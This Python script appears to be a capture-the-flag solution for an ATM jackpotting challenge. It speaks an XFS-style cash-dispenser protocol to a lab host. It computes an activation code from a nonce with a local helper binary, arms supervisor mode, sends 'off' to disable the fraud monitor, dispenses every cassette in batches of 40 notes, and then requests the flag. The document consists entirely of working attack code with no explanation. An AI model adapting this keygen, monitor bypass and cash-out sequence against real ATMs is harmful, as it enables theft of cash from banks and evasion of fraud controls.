import socket
import struct
import json
import subprocess

def send_msg(s, msg_type, cmd_id, data=b""):
    length = len(data)
    packet = bytes([msg_type]) + struct.pack(">I", cmd_id) + struct.pack(">H", length) + data
    s.sendall(packet)

def recv_msg(s):
    len_bytes = s.recv(2)
    if not len_bytes:
        return None
    length = struct.unpack(">H", len_bytes)[0]
    data = s.recv(length)
    return json.loads(data.decode("utf-8"))

# Get activation code using local binary helper
res = subprocess.run(["python3", "pyhelper.py"], capture_output=True, text=True)
code = res.stdout.strip()
print(f"[*] Activation code: {code}")

s = socket.create_connection(("10.48.178.100", 9100), timeout=5)
print("[+] Connected to port 9100")

# Read banner
banner = recv_msg(s)

# 1. Get status to verify current nonce
send_msg(s, 0x01, 0x301)
status_resp = recv_msg(s)
status = status_resp.get("status", {})
nonce = status.get("nonce")
print(f"[*] Current Nonce: {nonce}")

# Re-calculate code if nonce changed
if nonce != "271208":
    res = subprocess.run(["./jackpot", str(nonce)], capture_output=True, text=True)
    for line in res.stdout.splitlines():
        if "activation code:" in line:
            code = line.split(":")[-1].strip()
    print(f"[*] Recalculated Code: {code}")

# 2. Arm supervisor mode (EXECUTE = 0x02, WFS_CMD_CDM_ARM = 0x4f0)
# Payload can be string/bytes of the activation code
print("[*] Arming supervisor mode...")
send_msg(s, 0x02, 0x4f0, code.encode())
print("[<] Arm Response:", recv_msg(s))

# 3. Disable monitor (EXECUTE = 0x02, WFS_CMD_CDM_SET_MONITOR = 0x4f1)
print("[*] Disabling fraud monitor...")
send_msg(s, 0x02, 0x4f1, b"off")
print("[<] Monitor Response:", recv_msg(s))

# 4. Empty cassettes via WFS_CMD_CDM_DISPENSE (0x401)
cassettes = status.get("cassettes", [])
for c in cassettes:
    cid = c['id']
    count = c['count']
    print(f"[*] Emptying Cassette {cid} ({count} notes)...")
    while count > 0:
        batch = min(40, count)
        payload = json.dumps({"cassette": cid, "count": batch}).encode()
        send_msg(s, 0x02, 0x401, payload)
        res = recv_msg(s)
        count -= batch

# 5. Retrieve the flag (GETINFO = 0x01, WFS_CMD_CDM_GET_FLAG = 0x4ff)
print("[*] Requesting flag...")
send_msg(s, 0x01, 0x4ff)
flag_resp = recv_msg(s)
print("\n[+] Vault Empty & Flag Captured:")
print(json.dumps(flag_resp, indent=2))

s.close()
